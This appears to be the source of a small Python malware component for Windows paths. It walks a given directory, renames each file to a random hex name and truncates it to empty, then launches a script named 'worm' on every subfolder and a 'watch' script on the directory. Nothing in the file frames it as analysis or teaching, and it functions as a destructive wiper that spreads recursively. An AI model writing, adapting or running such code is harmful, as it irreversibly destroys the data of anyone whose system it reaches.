import sys
import ctypes
import os
import uuid
from subprocess import Popen
from vars import *

cwd = sys.argv[1]
for i in os.listdir(cwd):
    if os.path.isfile(cwd+"\\"+i):
        newname = uuid.uuid4().hex
        try:
            os.rename(cwd+"\\"+i,cwd+"\\"+newname)
            f = open(cwd+"\\"+newname,"w")
            f.close()
        except:
            continue
    else:
        Popen([python,worm,cwd+"\\"+i])
Popen([python,watch,cwd])
